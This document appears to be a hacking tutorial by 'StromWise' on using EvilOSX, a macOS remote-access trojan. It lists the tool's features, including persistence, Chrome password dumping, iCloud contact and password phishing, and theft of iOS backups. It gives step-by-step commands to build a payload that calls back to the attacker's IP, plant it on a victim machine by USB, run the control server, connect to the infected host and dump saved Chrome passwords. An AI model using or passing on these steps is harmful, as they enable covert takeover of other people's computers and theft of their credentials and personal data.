# In this tutorial you will learn how to How To Take Control Over MacOS Computers Using EVILOSX.

## EvilOSX has a bunch of useful features:


- Ability to emulate a terminal instance, which means we can input commands directly as though we were sitting behind the machine's terminal interface.

- Sockets are encrypted with CSR via OpenSSL. Our communications to our infected hosts are encrypted, ensuring our communications remain secure.

- No dependencies, aside from standard Python libraries, meaning nothing extra to install.

- Persistence, or the ability to migrate to an in-memory process so that it can survive after the terminal it's launched in is closed.

- Dumping of Chrome passwords, which we will explore in this guide. There can be quite a lot of passwords for a lot of accounts.

- Retrieve iCloud contacts, allowing for easily targeted phishing attacks.

- Sophisticated iCloud password phishing attacks targeting the password.

- Find and show local iOS backups, to steal device backups from the disk.

- Download and upload files, allowing you to take or install further files on the infected host.

- Retrieve Find My iPhone devices, to start learning about the owner of them.

- Attempt to get root via local privilege escalation based on the linked exploit of macOS, which was patched on 10/11/2015.

- A handy auto-installer. Once you run EvilOSX on the target, this takes care of the rest automatically.



Step 1:  git clone https://github.com/Marten4n6/EvilOSX.git
Step 2:  cd EvilOSX
Step 3:  pip install -r requirements.txt



____________________________________________________________________________________________________________________________________________

## Build an EvilOSX Payload

Step 1:  cd EvilOSX
Step 2:  ls

We'll need some information to build this payload, such as the IP address of our attacking machine. To find it, you can type ip a into the terminal window or ifconfig if you're on a Mac. If you wanted to run the attack outside your local network, you'd need a static, public IP to do so.

Step 3:  Write down the IP address of your attacker machine (in my example, it's 192.168.0.24), and then we'll start building our payload by typing the following in the terminal.

Step 4:  The program will ask you for the IP address of the attacking computer. Enter your IP address, and then the server port of your choice. You can use 1337 for this build.It'll then ask you where EvilOSX should live, choose anything you want. When it asks about whether to use "python" or "rubber_ducky," choose Python. The loader you can leave empty, then input a launch agent name, followed by a payload file name. The result should be an EvilOSX Launcher Python build file located in the /builds folder.

Step 5:  Load this file onto a USB flash drive, or use something like Dat to copy the "EvilOSX.py" file you just created to your target computer.



____________________________________________________________________________________________________________________________________________


## Start the EvilOSX Server

Step 1:  python start.py --cli --port 1337

Step 2:  The server will start, and that's all. At any point, you can type help to see all the available commands.




____________________________________________________________________________________________________________________________________________

## Run the Payload on the Target

Step 1:  python /FILELOCATION/Launcher-9a6953.py

Now that our server is set up, on the vicitm machine on same network, run the Python payload you created by typing the following command, with "FILELOCATION" changed to your directory.


____________________________________________________________________________________________________________________________________________


## Execute Remote Commands

Step 1:  On our server, we can see that it's creating an encrypted payload. Using the bot command, we can see that we have control over the macOS computer.

- bot

Step 2:  Now, the most interesting thing we can do now is run a module or two. To see a list of all the possible ones, use the modules command.

- modules

Step 3:  To connect to this client, we will type connect 0, with "0" substituted for the ID of the client you're trying to connect to.

- connect 0

Step 4:  use get_info
Step 5:  We can dig deeper too with the decrypt.mme command.

- use decrypt.mme



____________________________________________________________________________________________________________________________________________


## Dump the Chrome Passwords

Step 1:  use chrome_passwords


____________________________________________________________________________________________________________________________________________

## Clean Up

When finished doing whatever remote administration it is that you're doing, make sure to send a final remove_bot command to kill the connection, and clean up and remove the client-server. After this, you won't be able to connect again, so make sure you're ready to let go before running this last command.

Step 1:  use remove_bot

____________________________________________________________________________________________________________________________________________




____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________

